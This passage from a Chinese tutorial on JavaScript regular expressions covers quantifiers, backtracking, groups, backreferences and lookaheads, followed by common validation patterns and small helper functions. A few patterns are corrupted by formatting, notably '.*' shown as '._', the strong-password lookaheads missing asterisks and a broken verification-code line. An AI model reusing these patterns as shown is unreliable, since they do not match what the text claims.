<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;aabab&quot;</span>.<span class="title function_">match</span>(<span class="regexp">/a.*b/g</span>)); <span class="comment">//aabab</span></span><br></pre></td></tr></table></figure>

<p>懒惰量词:在量词后加？，也就是匹配尽可能少的字符。其工作方式与贪婪量词相反。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;abaab&quot;</span>.<span class="title function_">match</span>(<span class="regexp">/a.*?b/g</span>));</span><br></pre></td></tr></table></figure>

<p>懒惰限定符</p>
<table>
<thead>
<tr>
<th>代码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>*?</td>
<td>重复任意次，但尽可能少重复</td>
</tr>
<tr>
<td>+?</td>
<td>重复 1 次或更多次，但尽可能少重复</td>
</tr>
<tr>
<td>??</td>
<td>重复 0 次或 1 次，但尽可能少重复</td>
</tr>
<tr>
<td>{n,m}?</td>
<td>重复 n 到 m 次，但尽可能少重复</td>
</tr>
<tr>
<td>{n,}?</td>
<td>重复 n 次以上，但尽可能少重复</td>
</tr>
</tbody></table>
<p>独占量词，在简单量词前加+。独占量词只尝试一次。但是 javascript 不支持。<br>​</p>
<h3 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h3><p>回溯法也称试探法，它的基本思想是：从问题的某一种状态（初始状态）出发，搜索从这种状态出发<br>所能达到的所有“状态”，当一条路走到“尽头”的时候（不能再前进），再后退一步或若干步，从<br>另一种可能“状态”出发，继续搜索，直到所有的“路径”（状态）都试探过。这种不断“前进”、<br>不断“回溯”寻找解的方法，就称作“回溯法”。本质上就是深度优先搜索算法。<br><strong>贪婪优先回溯</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630049384332-631e2c0e-df74-44be-9462-e8f64ba61e79.png#clientId=ud90bccad-2fcf-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=667&id=u2148a1f3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=667&originWidth=869&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=81418&status=done&style=none&taskId=u45e581f4-fb22-4f91-b6d8-d6a9c9d46ba&title=&width=869" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630049461659-ea62565b-8835-4f95-9431-396548255078.png#clientId=ud90bccad-2fcf-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=835&id=ubc26d698&margin=%5Bobject%20Object%5D&name=image.png&originHeight=835&originWidth=669&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=75919&status=done&style=none&taskId=u462da115-80ec-422e-ac3c-8d8056de2b7&title=&width=669" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630049573339-7077a704-7fe1-45ab-a978-2065dc711c49.png#clientId=ud90bccad-2fcf-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=822&id=u852ddd40&margin=%5Bobject%20Object%5D&name=image.png&originHeight=822&originWidth=696&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=74412&status=done&style=none&taskId=u24cb7d7f-e559-4534-b137-e1469223e34&title=&width=696" alt="image.png"><br>图中省略了尝试匹配双引号失败的过程。可以看出 ._ 是非常影响效率的。<br>为了减少一些不必要的回溯，可以把正则修改为 /“[^”]_”/。<br>​</p>
<p><strong>懒惰优先回溯</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630049802074-20da1ad3-f976-4c61-b7fa-797e199de017.png#clientId=ud90bccad-2fcf-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=555&id=u2f8af79a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=555&originWidth=686&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=70087&status=done&style=none&taskId=u2fda567a-d8db-46a2-81f7-7d5a8e9360e&title=&width=686" alt="image.png"></p>
<h3 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h3><p>到目前为止，我们接触到中括号表示范围内选择，大括号表示重复。小括号就可以表示分组，用作多字符的重复。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分组+量词</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/(dog)&#123;2&#125;/</span>.<span class="title function_">test</span>(<span class="string">&quot;dogdog&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//分组+范围</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;baddad&quot;</span>.<span class="title function_">match</span>(<span class="regexp">/([bd]ad?)*?/g</span>)); <span class="comment">//baddad,dad</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//分组+分组</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;mon and dad&quot;</span>.<span class="title function_">match</span>(<span class="regexp">/(mon( and dad)?)/</span>)); <span class="comment">//mon and dad,mon and dad, and dad</span></span><br><span class="line"><span class="comment">//man and dad 是符合正则模式的，而 and dad 是正则的一个分组]</span></span><br></pre></td></tr></table></figure>

<h4 id="捕获性分组"><a href="#捕获性分组" class="headerlink" title="捕获性分组"></a>捕获性分组</h4><p>所有分组默认都是捕获性分组，当使用 match 或者 exec 方法不带全局属性的时候，就可以在返回数组的第 1 位开始捕获到符合分组的内容。同时，也可以使用构造函数的全局属性 $1 至 $9 来获取。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/test(\d+)/</span>;</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;test001 test002&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(reg));</span><br><span class="line"><span class="comment">//[&quot;test001&quot;, &quot;001&quot;, index: 0, input: &quot;test001&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/test(\d+)/g</span>;</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;test001 test002&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(reg));</span><br><span class="line"><span class="comment">//[&quot;test001&quot;, &quot;test002&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/test(\d)+/</span>;</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;test001 test002&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(reg));</span><br><span class="line"><span class="comment">//[&quot;test001&quot;, &quot;1&quot;, index: 0, input: &quot;test001&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/test(\d)+/</span>;</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;test001 test002&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(reg));</span><br><span class="line"><span class="comment">//[&quot;test001&quot;, &quot;1&quot;, index: 0, input: &quot;test001&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/test(\d)+?/</span>;</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;test001 test002&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(reg));</span><br><span class="line"><span class="comment">//[&quot;test0&quot;, &quot;0&quot;, index: 0, input: &quot;test001&quot;]</span></span><br></pre></td></tr></table></figure>

<h4 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h4><p><strong>捕获会返回一个捕获组，这个分组是保存在内存中，不仅可以在正则表达式外部通过程序进行引用，也可以在正则表达式内部进行引用，这种引用方式就是反向引用</strong>。<br>反向引用标识由正则表达式中的匹配组捕获性分组。每个反向引用都由一个编号或名称来标识，并通过“\编号”表示法进行引用。（MDN 不推荐使用）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> color = <span class="string">&quot;#990000&quot;</span>;</span><br><span class="line"><span class="regexp">/#(\d+)/</span>.<span class="title function_">test</span>(color);</span><br><span class="line"><span class="title function_">alert</span>(<span class="title class_">RegExp</span>.<span class="property">$1</span>); <span class="comment">//990000</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/(dog)\1/</span>.<span class="title function_">test</span>(<span class="string">&quot;dogdog&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num = <span class="string">&quot;1234 5678&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> newNum = num.<span class="title function_">replace</span>(<span class="regexp">/(\d&#123;4&#125;) (\d&#123;4&#125;)/</span>, <span class="string">&quot;$2 $1&quot;</span>);</span><br><span class="line"><span class="title function_">alert</span>(newNum);</span><br></pre></td></tr></table></figure>

<p>你也可以自己指定分组的组名。要指定一个分组的组名，请使用这样的语法：(?&lt; name &gt;exp)这样就把这部分表达式的组名指定为 Word 了。要反向引用这个分组捕获的内容，你可以使用${name}来调用匹配到的内容</p>
<p>引用不存在的分组会直接转义数字</p>
<p>使用小括号的时候，还有很多特定用途的语法。下面列出了最常用的一些：</p>
<table>
<thead>
<tr>
<th>代码</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>(exp)</td>
<td>匹配 exp,并捕获文本到自动命名的组里</td>
</tr>
<tr>
<td>(?&lt; name &gt;exp)</td>
<td>匹配 exp,并捕获文本到名称为 name 的组里，也可以写成(?’name’exp)</td>
</tr>
<tr>
<td>(?:exp)</td>
<td>匹配 exp,不捕获匹配的文本，也不给此分组分配组号</td>
</tr>
</tbody></table>
<h4 id="非捕获性分组"><a href="#非捕获性分组" class="headerlink" title="非捕获性分组"></a>非捕获性分组</h4><p>并不是所有分组都能创建反向引用，有一种特别的分组称之为非捕获性分组，它是不会创建反向引用。反之，就是捕获性分组。要创建一个非捕获性分组，只要在分组的左括号的后面紧跟一个问号与冒号就行了。使用 match、exec 方法的时候就不会捕获到分组的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var reg = /test(?:\d)+/;</span><br><span class="line"> var str = &#x27;test001&#x27;;</span><br><span class="line"> console.log(str.match(reg));</span><br><span class="line">//[&quot;test001&quot;, index: 0, input: &quot;test001&quot;]</span><br></pre></td></tr></table></figure>

<h3 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h3><p>最大的作用是判断位置。</p>
<ol>
<li>断言：俗话的断言就是“我断定什么什么”，而正则中的断言，就是说正则可以指明在指定的内容的前面或后面会出现满足指定规则的内容.<br>意思正则也可以像人类那样断定什么什么，比如”ss1aa2bb3”,正则可以用断言找出 aa2 前面有 bb3，也可以找出 aa2 后面有 ss1.</li>
<li>零宽：就是没有宽度，在正则中，断言只是匹配位置，不占字符，也就是说，匹配结果里是不会返回断言本身。<table>
<thead>
<tr>
<th>正则</th>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>(?=exp)</td>
<td>正向前瞻 positive lookahead</td>
<td>匹配后面是 exp 位置</td>
</tr>
<tr>
<td>(?!exp)</td>
<td>负向前瞻 negative lookahead</td>
<td>匹配后面不是 exp 的位置</td>
</tr>
<tr>
<td>(?&lt;=exp)</td>
<td>正向后瞻 positive lookbehind</td>
<td>匹配前面是 exp 的位置</td>
</tr>
<tr>
<td>(?&lt;!exp)</td>
<td>负向后瞻 negative lookbehind</td>
<td>匹配前面不是 exp 的位置</td>
</tr>
</tbody></table>
</li>
</ol>
<p>正向前瞻用来检查接下来的出现的是不是某个特定的字符集。而负向前瞻则是检查接下来的不应该出现的特定字符串集。零宽断言是不会被捕获的。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str1 = <span class="string">&quot;bedroom&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> str2 = <span class="string">&quot;bedding&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> reBed = <span class="regexp">/(bed(?=room))/</span>; <span class="comment">//在我们捕获bed这个字符串时，抢先去看接下来的字符串是不是room</span></span><br><span class="line"><span class="title function_">alert</span>(reBed.<span class="title function_">test</span>(str1)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="title class_">RegExp</span>.<span class="property">$1</span>); <span class="comment">//bed</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="title class_">RegExp</span>.<span class="property">$2</span> === <span class="string">&quot;&quot;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(reBed.<span class="title function_">test</span>(str2)); <span class="comment">//false</span></span><br><span class="line"><span class="keyword">var</span> str1 = <span class="string">&quot;bedroom&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> str2 = <span class="string">&quot;bedding&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> reBed = <span class="regexp">/(bed(?!room))/</span>; <span class="comment">//要来它后面不能是room</span></span><br><span class="line"><span class="title function_">alert</span>(reBed.<span class="title function_">test</span>(str1)); <span class="comment">//false</span></span><br><span class="line"><span class="title function_">alert</span>(reBed.<span class="title function_">test</span>(str2)); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>小括号还有一种用途，就是通过语法 (?#comment) 来包含注释</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>[<span class="number">0</span>-<span class="number">4</span>]\<span class="title function_">d</span>(?#<span class="number">200</span>-<span class="number">249</span>)|<span class="number">25</span>[<span class="number">0</span>-<span class="number">5</span>](?#<span class="number">250</span>-<span class="number">255</span>)|[<span class="number">01</span>]?\d\d?(?#<span class="number">0</span>-<span class="number">199</span>)</span><br><span class="line"><span class="comment">// 注释表明每个分组范围</span></span><br></pre></td></tr></table></figure>

<h2 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h2><h2 id="检验"><a href="#检验" class="headerlink" title="检验"></a>检验</h2><h3 id="常用类型"><a href="#常用类型" class="headerlink" title="常用类型"></a>常用类型</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// QQ号码</span></span><br><span class="line">[<span class="number">1</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>]&#123;<span class="number">4</span>,<span class="number">14</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 手机号码</span></span><br><span class="line">^(<span class="number">13</span>[<span class="number">0</span>-<span class="number">9</span>]|<span class="number">14</span>[<span class="number">57</span>]|<span class="number">15</span>[<span class="number">0</span>-<span class="number">35</span>-<span class="number">9</span>]|<span class="number">18</span>[<span class="number">0</span>-<span class="number">35</span>-<span class="number">9</span>])\d&#123;<span class="number">8</span>&#125;$</span><br><span class="line"></span><br><span class="line"><span class="comment">// 身份证</span></span><br><span class="line">^([<span class="number">0</span>-<span class="number">9</span>])&#123;<span class="number">7</span>,<span class="number">18</span>&#125;(x|X)?$</span><br><span class="line">^[<span class="number">1</span>-<span class="number">9</span>]\\d&#123;<span class="number">5</span>&#125;[<span class="number">1</span>-<span class="number">9</span>]\\d&#123;<span class="number">3</span>&#125;((<span class="number">0</span>\\d)|(<span class="number">1</span>[<span class="number">0</span>-<span class="number">2</span>]))(([<span class="number">0</span>|<span class="number">1</span>|<span class="number">2</span>]\\d)|<span class="number">3</span>[<span class="number">0</span>-<span class="number">1</span>])\\d&#123;<span class="number">3</span>&#125;([<span class="number">0</span>-<span class="number">9</span>]|X)$</span><br><span class="line"></span><br><span class="line"><span class="comment">// IP地址</span></span><br><span class="line"><span class="comment">// v4</span></span><br><span class="line">\\<span class="title function_">b</span>(<span class="params">?:(?:<span class="number">25</span>[<span class="number">0</span>-<span class="number">5</span>]|<span class="number">2</span>[<span class="number">0</span>-<span class="number">4</span>][<span class="number">0</span>-<span class="number">9</span>]|[<span class="number">01</span>]?[<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>]?)\\.</span>)&#123;<span class="number">3</span>&#125;(?:<span class="number">25</span>[<span class="number">0</span>-<span class="number">5</span>]|<span class="number">2</span>[<span class="number">0</span>-<span class="number">4</span>][<span class="number">0</span>-<span class="number">9</span>]|[<span class="number">01</span>]?[<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>]?)\\b</span><br><span class="line"><span class="comment">// v6</span></span><br><span class="line">(([<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">7</span>,<span class="number">7</span>&#125;[<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;|([<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">1</span>,<span class="number">7</span>&#125;:|([<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">1</span>,<span class="number">6</span>&#125;:[<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;|([<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">1</span>,<span class="number">5</span>&#125;(:[<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)&#123;<span class="number">1</span>,<span class="number">2</span>&#125;|([<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">1</span>,<span class="number">4</span>&#125;(:[<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)&#123;<span class="number">1</span>,<span class="number">3</span>&#125;|([<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">1</span>,<span class="number">3</span>&#125;(:[<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)&#123;<span class="number">1</span>,<span class="number">4</span>&#125;|([<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">1</span>,<span class="number">2</span>&#125;(:[<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)&#123;<span class="number">1</span>,<span class="number">5</span>&#125;|[<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:((:[<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)&#123;<span class="number">1</span>,<span class="number">6</span>&#125;)|:((:[<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)&#123;<span class="number">1</span>,<span class="number">7</span>&#125;|:)|<span class="attr">fe80</span>:(:[<span class="number">0</span>-9a-fA-F]&#123;<span class="number">0</span>,<span class="number">4</span>&#125;)&#123;<span class="number">0</span>,<span class="number">4</span>&#125;%[<span class="number">0</span>-9a-zA-Z]&#123;<span class="number">1</span>,&#125;|::(<span class="title function_">ffff</span>(<span class="params">:<span class="number">0</span>&#123;<span class="number">1</span>,<span class="number">4</span>&#125;</span>)&#123;<span class="number">0</span>,<span class="number">1</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">1</span>&#125;((<span class="number">25</span>[<span class="number">0</span>-<span class="number">5</span>]|(<span class="number">2</span>[<span class="number">0</span>-<span class="number">4</span>]|<span class="number">1</span>&#123;<span class="number">0</span>,<span class="number">1</span>&#125;[<span class="number">0</span>-<span class="number">9</span>])&#123;<span class="number">0</span>,<span class="number">1</span>&#125;[<span class="number">0</span>-<span class="number">9</span>])\\.)&#123;<span class="number">3</span>,<span class="number">3</span>&#125;(<span class="number">25</span>[<span class="number">0</span>-<span class="number">5</span>]|(<span class="number">2</span>[<span class="number">0</span>-<span class="number">4</span>]|<span class="number">1</span>&#123;<span class="number">0</span>,<span class="number">1</span>&#125;[<span class="number">0</span>-<span class="number">9</span>])&#123;<span class="number">0</span>,<span class="number">1</span>&#125;[<span class="number">0</span>-<span class="number">9</span>])|([<span class="number">0</span>-9a-fA-F]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:((<span class="number">25</span>[<span class="number">0</span>-<span class="number">5</span>]|(<span class="number">2</span>[<span class="number">0</span>-<span class="number">4</span>]|<span class="number">1</span>&#123;<span class="number">0</span>,<span class="number">1</span>&#125;[<span class="number">0</span>-<span class="number">9</span>])&#123;<span class="number">0</span>,<span class="number">1</span>&#125;[<span class="number">0</span>-<span class="number">9</span>])\\.)&#123;<span class="number">3</span>,<span class="number">3</span>&#125;(<span class="number">25</span>[<span class="number">0</span>-<span class="number">5</span>]|(<span class="number">2</span>[<span class="number">0</span>-<span class="number">4</span>]|<span class="number">1</span>&#123;<span class="number">0</span>,<span class="number">1</span>&#125;[<span class="number">0</span>-<span class="number">9</span>])&#123;<span class="number">0</span>,<span class="number">1</span>&#125;[<span class="number">0</span>-<span class="number">9</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 中文</span></span><br><span class="line">^[\\u4e00-\\u9fa5]&#123;<span class="number">0</span>,&#125;$</span><br><span class="line">/[\u4e00-\u9fa5]/</span><br><span class="line"><span class="comment">//用于匹配单个汉字。这两个unicode值正好是Unicode表中的汉字的头和尾。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// html</span></span><br><span class="line">&lt;\\/?\\w+((\\s+\\w+(\\s*=\\s*(?:&quot;.*?&quot;|&#x27;.*?&#x27;|[\\^&#x27;&quot;&gt;\\s]+))?)+\\s*|\\s*)\\/?&gt;</span><br><span class="line">&lt;(?[\w]+)[^&gt;]*?&gt;((?&lt;Nested&gt;&lt;\k[^&gt;]*&gt;)|&lt;/\k&gt;(?&lt;-Nested&gt;)|.*?)*&lt;/\k&gt;</span><br><span class="line"></span><br><span class="line">// 十六进制颜色值匹配</span><br><span class="line"></span><br><span class="line">/#[0-9a-fA-F]&#123;6&#125;|#[0-9a-fA-F]&#123;3&#125;/g</span><br><span class="line"></span><br><span class="line">// Windows操作系统文件路径匹配</span><br><span class="line">盘符使用 [a-zA-Z]:\\ ，这里需要注意 \ 字符需要转义，并且盘符不区分大小写；</span><br><span class="line">文件名或文件夹名，不能包含特殊字符，使用 [^\\:*&lt;&gt;|&quot;?\r\n/] 表示合法字符；</span><br><span class="line">并且至少有一个字符，还有可以出现任意次，就可以使用 ([^\\:*&lt;&gt;|&quot;?\r\n/]+\\)* 匹配任意个 文件夹\；</span><br><span class="line">还有路径最后一部分可以是 文件夹 ，即没有 \ 于是表示成 ([^\\:*&lt;&gt;|&quot;?\r\n/]+)?</span><br><span class="line"> /^[a-zA-Z]:\\([^\\:*&lt;&gt;|&quot;?\r\n/]+\\)*([^\\:*&lt;&gt;|&quot;?\r\n/]+)?$/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 密码\w&#123;5,17&#125;$ 字母开头，长度在6~18之间，只能包含字母、数字和下划线</span><br><span class="line"></span><br><span class="line">// 强密码：^(?=.\d)(?=.[a-z])(?=.*[A-Z]).&#123;8,10&#125;$ 包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间</span><br><span class="line">电话号码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 邮箱</span><br><span class="line"></span><br><span class="line">[\\w!#$%&amp;&#x27;*+/=?^_`&#123;|&#125;~-]+(?:\\.[\\w!#$%&amp;&#x27;*+/=?^_`&#123;|&#125;~-]+)*@(?:[\\w](?:[\\w-]*[\\w])?\\.)+[\\w](?:[\\w-]*[\\w])?</span><br><span class="line"></span><br><span class="line">// yyyy-MM-dd  平闰年</span><br><span class="line">  ^(?:(?!0000)[0-9]&#123;4&#125;-(?:(?:0[1-9]|1[0-2])-(?:0[1-9]|1[0-9]|2[0-8])|(?:0[13-9]|1[0-2])-(?:29|30)|(?:0[13578]|1[02])-31)|(?:[0-9]&#123;2&#125;(?:0[48]|[2468][048]|[13579][26])|(?:0[48]|[2468][048]|[13579][26])00)-02-29)$</span><br></pre></td></tr></table></figure>

<p>​</p>
<p>​</p>
<p>​</p>
<p>验证码/<a href="#fn2">[2]</a>{4}$]/</p>
<p>网址<br>​</p>
<p>千分位格式化</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">numFormat</span>(<span class="params">num</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> res = num</span><br><span class="line">    .<span class="title function_">toString</span>()</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/\d+/</span>, <span class="function">(<span class="params">n</span>) =&gt;</span> n.<span class="title function_">replace</span>(<span class="regexp">/\B(?=(\d&#123;3&#125;)+\b)/g</span>, <span class="string">&quot;,&quot;</span>));</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1234567894532</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">673439.4542</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">numFormat</span>(a)); <span class="comment">// &quot;1,234,567,894,532&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">numFormat</span>(b)); <span class="comment">// &quot;673,439.4542&quot;</span></span><br></pre></td></tr></table></figure>

<p>单词首字母大写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var a = &quot;asdf&quot;;</span><br><span class="line"> String.prototype.capitalize =  function () &#123;</span><br><span class="line">     return this.replace(/^\w/, function (s) &#123;</span><br><span class="line">         return s.toUpperCase();</span><br><span class="line">     &#125;);</span><br><span class="line"> &#125;</span><br><span class="line">alert(a.capitalize())//Asdf</span><br></pre></td></tr></table></figure>

